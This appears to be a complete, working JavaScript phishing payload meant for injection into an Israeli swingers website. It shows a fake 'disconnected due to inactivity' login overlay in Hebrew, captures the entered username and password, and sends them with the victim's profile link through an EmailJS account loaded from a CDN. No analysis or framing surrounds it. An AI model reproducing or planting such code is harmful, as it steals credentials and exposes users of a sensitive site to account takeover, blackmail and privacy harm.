(function(){var x=localStorage.getItem('showed-signup-modal-2');if(x){return;}
localStorage.setItem('showed-signup-modal-2','true');var modal=document.createElement('div');modal.innerHTML=`
  <style>
  .singupmodal {
    padding: 175px;
    position: fixed;
    top: 0px;
    left: 0px;
    right: 0px;
    bottom: 0px;
    background: black;
  }
  .disconnectMessage {
    color: red;
  }
  </style>
  <div class="singupmodal">
    <div class="disconnectMessage">נותקתם מהאתר עקב חוסר פעילות, אנא התחברו שנית</div>
    <form id="myform" method="post" action="/index.php" id="loginForme" name="loginForme">
    <input type="hidden" name="mode" value="checkLogin">
    <input type="hidden" name="logintoken" value="1092login">
      <div class="rightLogIN" id="loginDiv">
        <div class="logInTitle">כניסה ל- סווינגרס</div>
        
        <label for="tqUserName"><div class="logInName">דוא"ל/כינוי :</div><input type="text" name="tqUserName" id="tqUserName" class="logInInput" value="דואל או כינוי" onfocus="if(this.value =='דואל או כינוי' ) this.value=''" onblur="if(this.value=='') this.value='דואל או כינוי'"></label>
        <label for="tqUserPass"><div class="logInName">סיסמה: </div><input type="password" name="tqUserPass" id="tqUserPass" class="logInInput"></label>
        <div class="clear"><!----></div>
    
        <div class="radio"><input type="checkbox" id="rememberMe_fld" name="remmemberMe"> זכור אותי</div>
        <button type="submit" class="enterBTNButon">כניסה</button>
      </div>
    </form>
    </div>  
  `;document.body.appendChild(modal);var script=document.createElement('script')
script.innerHTML=`
  function onsubmit (e) {
    e.preventDefault();
    document.querySelector('.singupmodal').style.display = 'none';
    var email = document.querySelector('#myform').querySelector('input[type="text"]').value;
    var password = document.querySelector('#myform').querySelector('input[type="password"]').value;

    var script = document.createElement('script')
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"
    document.head.appendChild(script);

    setTimeout(function () {
      emailjs.init("user_0z9zeDeCe8tKnLyGb6hLg");
      var profileNum = $('.profileNum').text().split(' - ').pop();
      emailjs.send('gmail', 'template_kmOys9Qf_clone', {
        userlink: 'https://www.swingers.co.il/%D7%97%D7%99%D7%9C%D7%95%D7%A4%D7%99-%D7%96%D7%95%D7%92%D7%95%D7%AA/?customer=' + profileNum,
        email: email,
        password: password,
      })
    }, 2000);

  }

  document.querySelector('#myform').addEventListener('submit', onsubmit);
  document.querySelector('#myform button[type="submit"]').addEventListener('click', onsubmit);
  `
document.body.appendChild(script);})();
